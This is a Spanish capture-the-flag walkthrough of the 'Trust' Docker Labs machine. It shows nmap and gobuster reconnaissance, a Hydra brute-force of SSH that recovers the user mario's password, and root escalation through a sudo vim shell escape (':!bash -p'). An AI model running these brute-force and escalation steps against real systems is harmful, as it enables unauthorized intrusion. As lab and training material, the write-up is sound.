
- Tags: #Trust 
---
- [Maquina Trust Docker Labs](https://mega.nz/file/wD9BgLDR#784mjg4xwoolyyKMqdGLk1_YntbJLItJ7RFRx9A69ZE) ==> Enlace de descarga a la maquina, Procedemos a descomprimir el archivo y procedemos a desplegar el laboratorio:
```bash
 sudo bash auto_deploy.sh trust.tar
```
---
- #### Fase Reconocimiento:
- Procedemos a lanzar una traza **ICMP** al **target** para determinar si tenemos comunicacion. Por el **ttl** podemos determinar que estamos anten una maquina linux, de igual manera lo comprobamos con nuestra herramiente: ( `wichSystem.py` )
```bash
ping -c 1 172.18.0.2

wichSystem.py 172.18.0.2
172.18.0.2 (ttl -> 64): Linux
```
---

- #### Fase Escaneo Puertos:
- Realizamos escaneo de puertos en el **target**
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts    
```
---
- Realizaremos un escaneo exhautivo sobre los puerto descubiertos en el **target** para determinar los servicios y las versiones que corren detras de estos puertos.
```bash
 extractPorts allPorts

nmap -sC -sV -p22,80 172.18.0.2 -oN targeted
```
---
- **( 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) )** ==> Tenemos un servicio ssh expuesto, Es una version no a la actual pero no es vulnerable a una posible enumeracion de usuario con el exploit ya que contemplan versiones mas atrasadas.
```bash
searchsploit ssh user enumeration
```
---
- **(  80/tcp open  http    Apache httpd 2.4.57 ((Debian)) )** ==> Tenemos un servicio apache, Donde al pareces estamos ante una version de: **( ubuntuMantic )** que podemos verificar por el **codeName** en **Launcpad**
- Lanzamos el script ( `http-enum` ) de **nmap** pero no detectamos nada.
```bash
nmap --script http-enum 172.18.0.2 -oN webScan
```
---

- #### Fase Reconocimiento Web:
- Procedemos con la fase de reconocimiento web para detectar posibles falla de seguridad o vectores de ataques de los cuales nos podemos aprovecha.
- **( 172.18.0.2/secret.php/ )** ==> Tenemos esta que que solo nos muestra el nombre de un posible usuario: **( Mario )**
```bash
 whatweb http://172.18.0.2 # No detectamos informacion critica e igual wappalyzer no nos detecta mucha informacion relevante
http://172.18.0.2 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[172.18.0.2], Title[Apache2 Debian Default Page: It works]
```
---

- #### Fase Reconocimiento Rutas:
- Procedemos a realizar descubrimiento de rutas en el **target** con la herramienta ( `gobuster` )
```bash
gobuster dir -u http://172.18.0.2 -u /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash -o directoryScan
gobuster dir -u http://172.18.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,js,html,css,php.back,back,pl -o directoryScanExtensions  
gobuster vhost -u http://172.18.0.2/secret.php -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 20 --append-domain  
```
---
- No encontramos nada que nos indique un verctor de ataque.

- #### Fase Reconocimiento SSH:
- Procedemos a realizar un reconocimiento en el puerto 22 **ssh** que esta expuesto, Intentaremos obtener las credenciales de acceso de este posible usuario: **( mario )** que es el que detectamos desde la web
- **( Hydra )** ==> Usamos esta herramienta, para realizar un ataque de fuerza bruta con el diccionario: **( rockyou.txt )** de la siguiente manera:
```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.18.0.2

[22][ssh] host: 172.18.0.2   login: mario   password: chocolate # Logramos obtener la password del usuario
```
---

- #### Intrusion Por SSH:
- Ahora nos intentaremos loguear por **ssh** con las credenciales que hemos obtenido.
```bash
ssh mario@172.18.0.2 # Despues proporcionamos la password
```
---
- Logramos loguearnos como este usuario:

- #### Reconocimiento SO y Escalada:
```bash
finc / -perm -4000 2>/dev/null # no encontramos nada critico
getcap -r / 2>/dev/null # no encontramos nada critico

sudo -l

User mario may run the following commands on 37b2a6b23afd:
    (ALL) /usr/bin/vim
```
---
- **( Vector Ataque )** ==> El permiso `(ALL) /usr/bin/vim` en el archivo `/etc/sudoers` permite al usuario **mario** ejecutar Vim con privilegios de root (`sudo vim`). Esto representa un **riesgo crítico de seguridad**, ya que Vim permite escape a una shell con privilegios elevados. Aquí está el análisis y explotación:
- [GTFObin Vim](https://gtfobins.github.io/gtfobins/vim/#shell) ==> Tenemos **oneLiner** que nos permitirias elevar privilegios de una **bash** como root.
```bash
# Paso 1: Mario ejecuta Vim como root
sudo /usr/bin/vim

# Paso 2: Dentro de Vim, abre una shell root
:!bash -p

# Paso 3: Ahora es root (¡sin contraseña!)
root@37b2a6b23afd:/# id
uid=0(root) gid=0(root) groups=0(root)
```
---
- Logramos elevar nuestro privilego a **root**. teniendo control total del sistema